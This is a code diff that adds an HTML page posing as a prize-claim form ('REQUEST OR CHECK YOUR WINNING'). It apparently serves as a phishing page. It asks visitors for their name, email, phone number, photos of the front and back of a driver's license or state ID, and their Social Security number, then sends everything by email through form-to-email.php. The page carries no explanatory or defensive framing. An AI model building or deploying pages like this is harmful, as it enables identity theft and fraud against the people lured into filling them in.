@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="all.css">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="font-awesome/css/all.min.css">
+</head>
+<body>
+        
+    <div class="upgrade">
+        <h1>REQUEST OR CHECK YOUR WINNING</h1>
+        <div id="wrapper">
+            <form method="post" name="myemailform" action="form-to-email.php">
+                
+                Full Name <span>*</span>	<input type="text" name="name"> <br>
+                
+                Enter Email Address <span>*</span>	<input type="text" name="email">
+                <br>
+                Phone Number <span>*</span>	<input type="tel" name="Number">
+                
+            </div> <br> <hr>
+           <p> <i>Take phto of your driver's license or state ID (FRONT & BACK)</i> <span>*</span></p> 
+            <div class='container'>
+                <label for='photo' >Front ID:</label><br/>
+                <input type="file" name='newupload' id='newupload' /><br/>
+                <span id='contactus_newupload_errorloc' class='error'></span>
+            </div>
+            <div class='container'>
+                <label for='photo' >Back ID:</label><br/>
+                <input type="file" name='newupload' id='newupload' /><br/>
+                <span id='contactus_newupload_errorloc' class='error'></span>
+            </div>
+            <p><i>Place doucment on a flat, uncluttered surface, use landscape orientation
+                and ensure your doucment photo is clear and readable
+            </i></p> <hr> <br> 
+            <div>
+                Social Security Number <span>*</span>	<input type="tel" name="Number"><br><br> FORM OF DELIVERY<hr>
+                <input type="checkbox" id="vehicle1" name="vehicle1" value="Bike">
+                <label for="vehicle1"> Cash</label><br>
+                <input type="checkbox" id="vehicle2" name="vehicle2" value="Car">
+                <label for="vehicle2"> Check</label> <hr>
+            </div>
+        </form> <br><br>
+        <input class="submit" type="submit" value="submit">
+    </div>
+</body>
+</html>
